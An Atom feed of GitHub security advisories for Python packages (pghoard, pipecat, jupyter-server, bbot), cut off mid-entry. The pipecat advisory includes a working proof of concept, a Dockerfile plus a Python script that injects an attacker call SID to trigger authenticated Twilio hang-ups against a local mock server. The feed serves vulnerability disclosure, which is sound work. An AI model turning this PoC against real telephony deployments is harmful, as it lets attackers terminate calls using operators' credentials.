<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-06-18T16:14:16.433Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[pghoard] PGHoard: Password written to debug log]]></title>
        <id>https://github.com/advisories/GHSA-mpx4-jmpr-vm8v</id>
        <link href="https://github.com/advisories/GHSA-mpx4-jmpr-vm8v"/>
        <updated>2026-06-18T15:05:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When using .pgpass, database connection information including the username and password will be logged at the debug level.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to version 2.7.1 or greater.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Filter out debug-level logs.</p>
<h3 id="references">References</h3>
<p>This issue was discovered by BugCrowd user DRAKOKORIAN.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Aiven-Open/pghoard/security/advisories/GHSA-mpx4-jmpr-vm8v">https://github.com/Aiven-Open/pghoard/security/advisories/GHSA-mpx4-jmpr-vm8v</a></li>
<li><a href="https://github.com/advisories/GHSA-mpx4-jmpr-vm8v">https://github.com/advisories/GHSA-mpx4-jmpr-vm8v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mpx4-jmpr-vm8v</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-18T15:05:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pipecat-ai] Pipecat: Telephony WebSocket `/ws` Unauthenticated Call-Control Abuse via Attacker-Supplied Call SID]]></title>
        <id>https://github.com/advisories/GHSA-j8cv-x86q-rj85</id>
        <link href="https://github.com/advisories/GHSA-j8cv-x86q-rj85"/>
        <updated>2026-06-18T15:05:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="development-runner-telephony-websocket-ws-unauthenticated-call-control-abuse-via-attacker-supplied-call-sid">Development Runner Telephony WebSocket <code>/ws</code> Unauthenticated Call-Control Abuse via Attacker-Supplied Call SID</h2>
<h3 id="summary">Summary</h3>
<p>The pipecat development runner registers a <code>/ws</code> WebSocket endpoint for telephony testing that accepts connections without any authentication. An unauthenticated remote attacker who can reach an exposed runner endpoint can connect to this endpoint, send a crafted Twilio handshake message containing an attacker-supplied <code>callSid</code>, and cause the server to issue an authenticated Twilio REST API hang-up request against that call SID using the server operator's own credentials. This may allow the attacker to forcibly terminate an active call on the victim's Twilio account if the attacker knows or obtains a valid call SID for that account. Equivalent unauthenticated call-control sinks exist for Telnyx and Plivo. Maintainers are evaluating the final CVSS 3.1 score.</p>
<h3 id="details">Details</h3>
<p>The pipecat development runner registers a WebSocket route at <code>/ws</code> (<code>src/pipecat/runner/run.py:1116</code>). When a client connects, the server immediately accepts the connection without performing any authentication or signature verification (<code>run.py:1119</code>):</p>
<pre><code class="language-python">await websocket.accept()   # run.py:1119 — no auth check before this point
</code></pre>
<p>After acceptance, the server reads the Twilio WebSocket stream-start handshake and extracts the <code>callSid</code> field verbatim from the attacker-controlled JSON payload (<code>src/pipecat/runner/utils.py:223</code>):</p>
<pre><code class="language-python">call_id: start_data.get("callSid")   # utils.py:223 — tainted, attacker-supplied
</code></pre>
<p>The tainted <code>call_id</code> is then passed directly into <code>TwilioFrameSerializer</code> alongside the server's own Twilio account credentials, which are read from environment variables (<code>src/pipecat/runner/utils.py:513-517</code>):</p>
<pre><code class="language-python">TwilioFrameSerializer(
    stream_sid=stream_id,
    call_sid=call_id,                          # TAINTED
    account_sid=os.getenv("TWILIO_ACCOUNT_SID"),  # server credential
    auth_token=os.getenv("TWILIO_AUTH_TOKEN"),     # server credential
)
</code></pre>
<p><code>TwilioFrameSerializer</code> has <code>auto_hang_up</code> defaulting to <code>True</code> (<code>src/pipecat/serializers/twilio.py:56</code>). When the pipeline terminates and serializes an <code>EndFrame</code> or <code>CancelFrame</code>, <code>_hang_up_call()</code> is triggered (<code>twilio.py:141-147</code>). This method constructs a Twilio REST API URL containing the attacker-supplied <code>call_sid</code> and POSTs to it using the server's own credentials (<code>twilio.py:196</code>, <code>twilio.py:206</code>):</p>
<pre><code>POST https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Calls/{attacker_call_sid}.json
Authorization: Basic &lt;base64(account_sid:auth_token)&gt;
Body: Status=completed
</code></pre>
<p>The same unauthenticated call-control pattern exists for Telnyx (<code>src/pipecat/serializers/telnyx.py:188</code>, <code>:195</code>) and Plivo (<code>src/pipecat/serializers/plivo.py:180</code>, <code>:187</code>).</p>
<p>Although the runner defaults to <code>localhost</code> and is documented as a development runner, its telephony mode is commonly used with a public proxy hostname so that telephony providers can connect inbound calls. If the development runner is exposed to untrusted networks while configured with Twilio, Telnyx, or Plivo credentials, this becomes a realistic network-reachable attack surface.</p>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites</strong></p>
<ul>
<li>Docker (for building the isolated PoC image)</li>
<li>A clone of the pipecat repository at commit <code>b982b45a7ae1e5ee99e4390ad5a116cdd9b4a8e2</code> placed at <code>&lt;context_root&gt;/repo/</code></li>
<li>The files <code>vuln-001/Dockerfile</code> and <code>vuln-001/poc.py</code> present under <code>&lt;context_root&gt;/</code></li>
</ul>
<p><strong>Step 1 — Build the Docker image</strong></p>
<pre><code class="language-bash">docker build \
  -f vuln-001/Dockerfile \
  -t vuln001-poc \
  reports/pypiAi_247_pipecat-ai__pipecat
</code></pre>
<p>The Dockerfile installs pipecat from the local repository clone, generates a self-signed TLS CA and server certificate for <code>api.twilio.com</code>, and registers that CA in the system trust store so that pipecat's <code>aiohttp</code>-based HTTP client accepts the mock server certificate.</p>
<p><strong>Step 2 — Run the PoC</strong></p>
<pre><code class="language-bash">docker run --rm \
  --add-host api.twilio.com:127.0.0.1 \
  vuln001-poc
</code></pre>
<p>The <code>--add-host</code> flag redirects DNS resolution for <code>api.twilio.com</code> to the loopback interface so all outgoing Twilio REST API calls hit the mock server instead of Twilio's real infrastructure.</p>
<p><strong>What the PoC does</strong></p>
<ol>
<li>Starts a local TLS-enabled HTTP server on <code>127.0.0.1:443</code> that impersonates <code>api.twilio.com</code> and records every incoming POST request.</li>
<li>Simulates the attacker-controlled WebSocket handshake message with an injected <code>callSid</code>:<pre><code class="language-json">{"event": "start", "start": {"streamSid": "MX000...", "callSid": "CAATTACKER1337INJECTED00000000001", "customParameters": {}}}
</code></pre>
</li>
<li>Runs the exact pipecat code path: parses <code>callSid</code> from attacker input (<code>utils.py:223</code>), constructs <code>TwilioFrameSerializer</code> with server credentials (<code>utils.py:513-517</code>), and calls <code>serialize(EndFrame())</code> which triggers <code>_hang_up_call()</code> (<code>twilio.py:141-147</code>, <code>:196</code>, <code>:206</code>).</li>
<li>Verifies that the mock server received a POST whose URL contains the attacker-injected call SID.</li>
</ol>
<p><strong>Expected output (passing)</strong></p>
<pre><code>[PASS] *** VULNERABILITY CONFIRMED ***
[PASS] Attacker callSid 'CAATTACKER1337INJECTED00000000001' appears in Twilio REST API URL.
[PASS] The server used its own credentials (account_sid=ACFAKE000000000000000000000000001)
[PASS] to issue an authenticated hang-up command for the attacker-specified call SID.
</code></pre>
<p><strong>Observed intercepted request (Phase 2 dynamic reproduction)</strong></p>
<pre><code>POST https://api.twilio.com/2010-04-01/Accounts/ACFAKE000000000000000000000000001/Calls/CAATTACKER1337INJECTED00000000001.json
Authorization: Basic QUNGQUtFMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxOmZha2VfYXV0aF90b2tlbl9wb2Nfb25seQ==
Body: Status=completed
</code></pre>
<p>Decoding the <code>Authorization</code> header confirms <code>ACFAKE000000000000000000000000001:fake_auth_token_poc_only</code> — the server's own credentials were used against the attacker-specified call SID.</p>
<h3 id="impact">Impact</h3>
<p>This is a Missing Authorization vulnerability (CWE-862) in the development runner's telephony WebSocket handling. An unauthenticated network actor who can reach an exposed <code>/ws</code> WebSocket endpoint of a pipecat development runner configured with Twilio, Telnyx, or Plivo credentials may be able to:</p>
<ol>
<li><strong>Forcibly terminate active calls whose valid call-control identifiers are known or obtained</strong> on the server operator's Twilio, Telnyx, or Plivo account by injecting the victim call identifier into the WebSocket handshake and then triggering pipeline termination.</li>
<li><strong>Cause denial of service</strong> against affected calls by repeatedly terminating calls for which the attacker has valid call-control identifiers.</li>
<li><strong>Abuse the operator's telephony provider credentials</strong> to perform call-control actions that the attacker does not have direct access to, effectively escalating privilege over the operator's telephony account.</li>
</ol>
<p>Impacted parties include operators who expose the pipecat development runner's telephony <code>/ws</code> endpoint on a publicly reachable host with Twilio, Telnyx, or Plivo credentials configured, and their customers whose active calls can be disrupted if a valid call-control identifier is known or obtained by an attacker.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile">FROM python:3.11-slim

LABEL description="VULN-001 PoC: Telephony WebSocket /ws callSid injection (CWE-862)"

WORKDIR /poc

# Install system tools needed for certificate generation and trust management
RUN apt-get update &amp;&amp; apt-get install -y \
    openssl \
    ca-certificates \
    &amp;&amp; rm -rf /var/lib/apt/lists/*

# Generate a local CA and a server certificate for api.twilio.com.
# We add the CA to the system trust store so that Python's ssl module
# (used by aiohttp inside TwilioFrameSerializer._hang_up_call) accepts
# our mock HTTPS server at 127.0.0.1:443 as if it were real Twilio.
RUN mkdir -p /poc/certs \
    # CA private key
    &amp;&amp; openssl genrsa -out /poc/certs/ca.key 2048 \
    # Self-signed CA certificate (1 day is enough for a PoC run)
    &amp;&amp; openssl req -new -x509 -days 1 \
       -key /poc/certs/ca.key \
       -out /poc/certs/ca.crt \
       -subj "/CN=Mock Twilio CA/O=VULN001-PoC/C=US" \
    # Server private key
    &amp;&amp; openssl genrsa -out /poc/certs/server.key 2048 \
    # Server CSR — CN must match the hostname pipecat connects to
    &amp;&amp; openssl req -new \
       -key /poc/certs/server.key \
       -out /poc/certs/server.csr \
       -subj "/CN=api.twilio.com/O=Mock Twilio/C=US" \
    # SAN extension file (required for modern TLS hostname verification)
    &amp;&amp; printf "[SAN]\nsubjectAltName=DNS:api.twilio.com\n" &gt; /poc/certs/san.cnf \
    # Sign the server cert with our CA, including the SAN extension
    &amp;&amp; openssl x509 -req -days 1 \
       -in /poc/certs/server.csr \
       -CA /poc/certs/ca.crt \
       -CAkey /poc/certs/ca.key \
       -CAcreateserial \
       -out /poc/certs/server.crt \
       -extfile /poc/certs/san.cnf \
       -extensions SAN \
    # Add our CA to the Debian system trust store
    &amp;&amp; cp /poc/certs/ca.crt /usr/local/share/ca-certificates/mock_twilio_ca.crt \
    &amp;&amp; update-ca-certificates

# Install pipecat from the cloned repository.
# aiohttp is a pipecat base dependency; it is used inside _hang_up_call().
# numpy and soxr are required for pipecat audio utilities imported at module load.
COPY repo /pipecat
RUN pip install --no-cache-dir \
    -e "/pipecat" \
    aiohttp \
    "websockets&gt;=11"

# Fake Twilio server-side credentials (equivalent to what a real deployment reads from env).
# In a real deployment these are valid account credentials; here they just need to be non-empty
# so TwilioFrameSerializer passes its __init__ validation.
ENV TWILIO_ACCOUNT_SID=ACFAKE000000000000000000000000001
ENV TWILIO_AUTH_TOKEN=fake_auth_token_poc_only

COPY vuln-001/poc.py /poc/poc.py

# Run the PoC.  The container must be started with --add-host api.twilio.com:127.0.0.1
# so that DNS for api.twilio.com resolves to the local mock server.
CMD ["python3", "/poc/poc.py"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC for VULN-001: Telephony WebSocket /ws unauthenticated call-control abuse
via attacker-supplied call SID (CWE-862).

Vulnerability summary
---------------------
The pipecat telephony runner registers a /ws WebSocket endpoint that accepts
connections without any authentication (run.py:1119).  When a client connects,
the server parses the Twilio "start" handshake message and extracts the callSid
field verbatim from the attacker-controlled payload (utils.py:223).  That
callSid is then injected into TwilioFrameSerializer together with the server's
own Twilio credentials read from environment variables (utils.py:513-517).
When the pipeline terminates and serializes an EndFrame, _hang_up_call() fires
and issues a Twilio REST API POST with the attacker's callSid in the URL
(twilio.py:196, :206), causing the server to hang up the attacker-specified
call SID if it identifies a valid call in the server's Twilio account.

What this PoC does
------------------
1. Starts a local HTTPS server on 127.0.0.1:443 that impersonates api.twilio.com
   and records every incoming POST request.  The TLS certificate was generated
   in the Docker build stage and the CA was injected into the system trust store,
   so aiohttp accepts it as legitimate.
2. Ensures /etc/hosts resolves api.twilio.com to 127.0.0.1 so that aiohttp's
   DNS lookup reaches the mock server instead of Twilio's real infrastructure.
3. Reproduces the exact vulnerable code path from pipecat:
     - Parses callSid from attacker-controlled input  (utils.py:223)
     - Creates TwilioFrameSerializer(call_sid=&lt;attacker_value&gt;,
                                     account_sid=TWILIO_ACCOUNT_SID,
                                     auth_token=TWILIO_AUTH_TOKEN)
                                                        (utils.py:513-517)
     - Calls serialize(EndFrame()) which internally invokes _hang_up_call()
                                                        (twilio.py:141-147)
     - _hang_up_call() POSTs to https://api.twilio.com/.../Calls/{callSid}.json
       using server-side Basic Auth credentials       (twilio.py:196, :206)
4. Verifies that the mock server received a POST whose URL contains the
   attacker-injected callSid, providing deterministic observable evidence.

Expected pass criterion
-----------------------
The intercepted POST path must contain ATTACKER_CALL_SID.  This proves that
an attacker who connects to /ws and sends a crafted callSid can cause the
pipecat server to issue authenticated Twilio REST API calls against the call
SID supplied by the attacker, using the server operator's credentials.

Requirements
------------
- Run inside the Docker image built from the accompanying Dockerfile.
- Start the container with --add-host api.twilio.com:127.0.0.1, OR run this
  script as root so that /etc/hosts can be written programmatically.
- Port 443 must be available (container runs as root by default).
"""

import asyncio
import json
import os
import ssl
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# The callSid the attacker injects into the Twilio WebSocket handshake.
# In a real attack this would need to be the SID of a victim's active call on
# the server operator's Twilio account.
ATTACKER_CALL_SID = "CAATTACKER1337INJECTED00000000001"

# Fake Twilio account credentials — in a real deployment these are real and
# are read from environment variables by pipecat (os.getenv).
FAKE_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID", "ACFAKE000000000000000000000000001")
FAKE_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN", "fake_auth_token_poc_only")

# Directory where the Docker build stage generated the TLS certificate pair.
CERTS_DIR = Path("/poc/certs")

# The mock Twilio HTTPS server listens here.  Must be 443 because pipecat
# hard-codes the Twilio API base URL to https://api.twilio.com (port 443).
MOCK_SERVER_HOST = "127.0.0.1"
MOCK_SERVER_PORT = 443

# ---------------------------------------------------------------------------
# Mock Twilio REST API server
# ---------------------------------------------------------------------------

# Thread-safe storage for captured requests; set by the handler thread.
_intercepted_requests: list[dict] = []
_request_received = threading.Event()


class MockTwilioAPIHandler(BaseHTTPRequestHandler):
    """
    Minimal HTTP handler that records POST requests.

    pipecat's _hang_up_call() issues exactly one POST request to:
        https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Calls/{call_sid}.json
    with Basic Auth (account_sid:auth_token) and body Status=completed.
    This handler captures that request verbatim.
    """

    def do_POST(self) -&gt; None:
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")

        captured = {
            "method": "POST",
            "path": self.path,
            "authorization": self.headers.get("Authorization", ""),
            "body": body,
        }
        _intercepted_requests.append(captured)
        _request_received.set()

        print()
        print("[MOCK TWILIO] *** Intercepted outgoing Twilio REST API call ***")
        print(f"[MOCK TWILIO] POST https://api.twilio.com{self.path}")
        print(f"[MOCK TWILIO] Authorization: {captured['authorization']}")
        print(f"[MOCK TWILIO] Body: {body}")
        print()

        # Respond with a minimal 200 JSON body that satisfies aiohttp's response parsing.
        response_body = json.dumps({"sid": "CA000000000000000000000000000001",
                                    "status": "completed"}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(response_body)))
        self.end_headers()
        self.wfile.write(response_body)

    def log_message(self, fmt: str, *args) -&gt; None:  # type: ignore[override]
        # Suppress the default per-request stderr log line.
        pass


def start_mock_twilio_server() -&gt; HTTPServer:
    """
    Start the mock Twilio HTTPS server in a daemon thread.

    The server uses the TLS certificate generated at Docker build time.
    That certificate is for api.twilio.com and is signed by the mock CA
    that was added to the system trust store via update-ca-certificates,
    so Python's ssl.create_default_context() (used by aiohttp) accepts it.
    """
    cert_file = CERTS_DIR / "server.crt"
    key_file = CERTS_DIR / "server.key"

    if not cert_file.exists() or not key_file.exists():
        print(f"[ERROR] TLS certificates not found in {CERTS_DIR}")
        print("[ERROR] Rebuild the Docker image: the Dockerfile generates them at build time.")
        sys.exit(1)

    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_ctx.load_cert_chain(str(cert_file), str(key_file))

    server = HTTPServer((MOCK_SERVER_HOST, MOCK_SERVER_PORT), MockTwilioAPIHandler)
    server.socket = ssl_ctx.wrap_socket(server.socket, server_side=True)

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ---------------------------------------------------------------------------
# /etc/hosts redirect
# ---------------------------------------------------------------------------

def ensure_hosts_redirect() -&gt; None:
    """
    Ensure api.twilio.com resolves to 127.0.0.1 in /etc/hosts.

    Preferred: pass --add-host api.twilio.com:127.0.0.1 to docker run.
    Fallback: write directly (requires root, which is the default in Docker).
    """
    hosts_path = Path("/etc/hosts")
    content = hosts_path.read_text()
    if "api.twilio.com" in content:
        print("[+] /etc/hosts already contains api.twilio.com -&gt; 127.0.0.1")
        return
    try:
        with open(hosts_path, "a") as fh:
            fh.write("\n127.0.0.1 api.twilio.com\n")
        print("[+] Wrote api.twilio.com -&gt; 127.0.0.1 into /etc/hosts")
    except PermissionError:
        print("[WARN] Cannot write /etc/hosts — start container with"
              " --add-host api.twilio.com:127.0.0.1")


# ---------------------------------------------------------------------------
# Core attack reproduction using pipecat's actual code
# ---------------------------------------------------------------------------

async def reproduce_attack() -&gt; None:
    """
    Reproduce the vulnerable pipecat code path step by step.

    This function uses the real pipecat library (installed from the cloned
    repository) and does NOT modify any source files.  The objective is to
    show that pipecat's own code, given attacker-controlled input on /ws,
    will issue an authenticated Twilio REST API call against the injected
    callSid.
    """
    # Import pipecat's actual serializer and frame types.
    from pipecat.serializers.twilio import TwilioFrameSerializer
    from pipecat.frames.frames import EndFrame

    print()
    print("=" * 65)
    print("Step 1 — Attacker-supplied WebSocket handshake (no auth check)")
    print("=" * 65)
    # This is what the attacker sends to /ws after the server calls
    # await websocket.accept()  (run.py:1119 — no prior auth check).
    attacker_ws_message = {
        "event": "start",
        "start": {
            "streamSid": "MX00000000000000000000000000000000",
            "callSid": ATTACKER_CALL_SID,   # &lt;-- attacker-controlled
            "customParameters": {}
        }
    }
    print(f"Attacker sends: {json.dumps(attacker_ws_message)}")

    print()
    print("=" * 65)
    print("Step 2 — pipecat parses callSid from attacker message")
    print("         (mirrors utils.py:218-230)")
    print("=" * 65)
    # Reproduction of utils.py:219-230
    start_data = attacker_ws_message["start"]
    call_id = start_data.get("callSid")      # utils.py:223 — tainted value
    stream_id = start_data.get("streamSid")
    print(f"Parsed call_id (attacker-controlled): {call_id}")
    print(f"Parsed stream_id:                     {stream_id}")

    print()
    print("=" * 65)
    print("Step 3 — TwilioFrameSerializer created with attacker callSid")
    print("         + server-side Twilio credentials (utils.py:513-517)")
    print("=" * 65)
    print(f"  call_sid    = {call_id!r}   [TAINTED: from attacker]")
    print(f"  account_sid = {FAKE_ACCOUNT_SID!r}   [from TWILIO_ACCOUNT_SID env var]")
    print(f"  auth_token  = {FAKE_AUTH_TOKEN[:8]!r}...   [from TWILIO_AUTH_TOKEN env var]")

    # This is the exact code at utils.py:513-517.
    serializer = TwilioFrameSerializer(
        stream_sid=stream_id,
        call_sid=call_id,             # TAINTED — attacker-supplied
        account_sid=FAKE_ACCOUNT_SID, # server credential
        auth_token=FAKE_AUTH_TOKEN,   # server credential
    )

    print()
    print("=" * 65)
    print("Step 4 — Pipeline ends: serialize(EndFrame()) triggers _hang_up_call()")
    print("         (twilio.py:141-147 -&gt; twilio.py:196, :206)")
    print("=" * 65)
    print("Calling serializer.serialize(EndFrame()) ...")
    print(f"Expected Twilio API URL:")
    print(f"  https://api.twilio.com/2010-04-01/Accounts/{FAKE_ACCOUNT_SID}"
          f"/Calls/{call_id}.json")
    print("(api.twilio.com resolves to 127.0.0.1 — intercepted by mock server)")

    # This line reproduces twilio.py:141-147 -&gt; _hang_up_call().
    # aiohttp will POST to api.twilio.com which /etc/hosts redirects to
    # our mock HTTPS server.  The mock server logs the request including
    # the attacker-injected callSid in the URL.
    await serializer.serialize(EndFrame())

    print("serialize(EndFrame()) returned — API POST dispatched.")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

async def main() -&gt; bool:
    print()
    print("=" * 65)
    print("VULN-001 PoC — Telephony WebSocket callSid Injection")
    print("CWE-862: Missing Authorization")
    print("pipecat-ai/pipecat @ commit b982b45")
    print("=" * 65)

    # 1. Redirect api.twilio.com to localhost
    ensure_hosts_redirect()

    # 2. Start the mock Twilio HTTPS server
    print("[*] Starting mock Twilio REST API server on 127.0.0.1:443 ...")
    start_mock_twilio_server()
    time.sleep(0.3)  # Let the server thread bind and start accepting.
    print("[+] Mock server ready.")

    # 3. Reproduce the attack using pipecat's own code
    try:
        await reproduce_attack()
    except Exception as exc:
        print(f"\n[ERROR] Attack reproduction raised an exception: {exc}")
        import traceback
        traceback.print_exc()
        return False

    # 4. Wait for the mock server to record the intercepted request
    print()
    print("[*] Waiting for mock Twilio server to receive POST request (timeout 10 s) ...")
    received = _request_received.wait(timeout=10.0)

    # 5. Evaluate evidence
    print()
    print("=" * 65)
    print("EVIDENCE EVALUATION")
    print("=" * 65)

    if not received or not _intercepted_requests:
        print("[FAIL] Mock Twilio server received no requests within 10 seconds.")
        print("       Likely causes:")
        print("       - api.twilio.com /etc/hosts entry missing or wrong")
        print("       - Port 443 could not be bound (need root)")
        print("       - CA certificate not added to system trust store")
        return False

    req = _intercepted_requests[0]
    path = req["path"]
    auth = req["authorization"]
    body = req["body"]

    print(f"Intercepted POST:")
    print(f"  URL:           https://api.twilio.com{path}")
    print(f"  Authorization: {auth}")
    print(f"  Body:          {body}")

    expected_fragment = f"/Calls/{ATTACKER_CALL_SID}.json"
    if expected_fragment in path:
        print()
        print("[PASS] *** VULNERABILITY CONFIRMED ***")
        print(f"[PASS] Attacker callSid '{ATTACKER_CALL_SID}' appears in Twilio REST API URL.")
        print(f"[PASS] The server used its own credentials (account_sid={FAKE_ACCOUNT_SID})")
        print(f"[PASS] to issue an authenticated hang-up command for the attacker-specified call SID.")
        print(f"[PASS] In a real deployment this terminates the call if the SID identifies an active call")
        print(f"[PASS] in the server operator's Twilio account.")
        return True
    else:
        print()
        print(f"[FAIL] Expected callSid not found in intercepted path: {path}")
        return False


if __name__ == "__main__":
    success = asyncio.run(main())
    sys.exit(0 if success else 1)
</code></pre>
<h3 id="resolution">Resolution</h3>
<p>This issue was addressed in pipecat-ai <code>v1.4.0</code> by adding optional HMAC token authentication for development-runner WebSocket endpoints.</p>
<p>Operators who expose the development runner’s WebSocket endpoints to anything other than localhost should upgrade to <code>v1.4.0</code> or later and enable WebSocket token authentication:</p>
<pre><code class="language-bash">PIPECAT_WEBSOCKET_AUTH=token
</code></pre>
<p>or:</p>
<pre><code class="language-bash">python bot.py -t twilio --ws-auth token
python bot.py -t websocket --ws-auth token
</code></pre>
<p>When enabled, clients must first call <code>POST /start</code> to obtain a short-lived, one-time-use signed token before connecting to <code>/ws</code> or <code>/ws-client</code>. Tokens may be supplied via
<code>Authorization: Bearer &lt;token&gt;</code>, <code>?token=&lt;token&gt;</code>, or as a path segment such as <code>/ws/&lt;token&gt;</code>, which is intended for telephony providers that cannot set custom headers. Invalid,
expired, or replayed tokens are rejected with WebSocket close code <code>4003</code>.</p>
<p>The fix was merged in <a href="https://github.com/pipecat-ai/pipecat/pull/4660">https://github.com/pipecat-ai/pipecat/pull/4660</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85">https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85</a></li>
<li><a href="https://github.com/pipecat-ai/pipecat/pull/4660">https://github.com/pipecat-ai/pipecat/pull/4660</a></li>
<li><a href="https://github.com/advisories/GHSA-j8cv-x86q-rj85">https://github.com/advisories/GHSA-j8cv-x86q-rj85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j8cv-x86q-rj85</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-18T15:05:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyter-server] Jupyter Server: Stored XSS in `NbconvertFileHandler` / `NbconvertPostHandler` via missing `sandbox` CSP ]]></title>
        <id>https://github.com/advisories/GHSA-fcw5-x6j4-ccmp</id>
        <link href="https://github.com/advisories/GHSA-fcw5-x6j4-ccmp"/>
        <updated>2026-06-18T15:04:09.000Z</updated>
        <content type="html"><![CDATA[<p>The nbconvert HTTP handlers in jupyter_server render user-authored notebook HTML under the Jupyter origin without a sandbox directive in their <code>Content-Security-Policy</code>. </p>
<p>Combined with <code>nbconvert.HTMLExporter</code>'s default non-sanitizing behavior, a notebook carrying an HTML payload in a display_data output triggers stored XSS with cookie access, full /api/* authority, and kernel RCE.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated victim who navigates to <code>/nbconvert/html/&lt;path&gt;</code> containing attacker-authored output can have their token exfiltrated to another domain because it is executed in the Jupyter origin.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in v2.20.0, commit <a href="https://github.com/jupyter-server/jupyter_server/commit/6cbee8d65e71abac851c4492fea987ad080580bd">6cbee8d</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>For deployments where editing the installed jupyter_server is impractical (containerized builds, read-only images), adding this to jupyter_server_config.py has the same effect as the patch above without touching source files:</p>
<pre><code>import jupyter_server.nbconvert.handlers as _nb

def _csp(self):
    return super(type(self), self).content_security_policy + "; sandbox allow-scripts"

_nb.NbconvertFileHandler.content_security_policy = property(_csp)
_nb.NbconvertPostHandler.content_security_policy = property(_csp)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyter-server/jupyter_server/security/advisories/GHSA-fcw5-x6j4-ccmp">https://github.com/jupyter-server/jupyter_server/security/advisories/GHSA-fcw5-x6j4-ccmp</a></li>
<li><a href="https://github.com/jupyter-server/jupyter_server/commit/6cbee8d65e71abac851c4492fea987ad080580bd">https://github.com/jupyter-server/jupyter_server/commit/6cbee8d65e71abac851c4492fea987ad080580bd</a></li>
<li><a href="https://github.com/advisories/GHSA-fcw5-x6j4-ccmp">https://github.com/advisories/GHSA-fcw5-x6j4-ccmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fcw5-x6j4-ccmp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-18T15:04:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bbot] BBOT: Symlink-Following Arbitrary Write via github_workflows Module]]></title>
        <id>https://github.com/advisories/GHSA-rvp7-w75q-9fv2</id>
        <link href="https://github.com/advisories/GHSA-rvp7-w75q-9fv2"/>
        <updated>2026-06-18T15:04:01.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>github_workflows</code> module constructs local directory paths from user-controlled repository names without validating for symlinks. A local attacker sharing the scan directory can plant a symlink at the predictable output path, causing workflow data to be written to an attacker-chosen location.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-rvp7-w75q-9fv2">https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-rvp7-w75q-9fv2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12567">https://nvd.nist.gov/vuln/detail/CVE-2026-12567</a></li>
<li><a href="https://github.com/blacklanternsecurity/bbot/commit/16d9c42b6">https://github.com/blacklanternsecurity/bbot/commit/16d9c42b6</a></li>
<li><a href="https://github.com/advisories/GHSA-rvp7-w75q-9fv2">https://github.com/advisories/GHSA-rvp7-w75q-9fv2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rvp7-w75q-9fv2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-18T15:04:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bbot] BBOT: Arbitrary File Write in postman_download Module]]></title>
        <id>https://github.com/advisories/GHSA-m54h-vhf9-3w3m</id>
        <link href="https://github.com/advisories/GHSA-m54h-vhf9-3w3m"/>
        <updated>2026-06-18T15:03:38.000Z</updated>
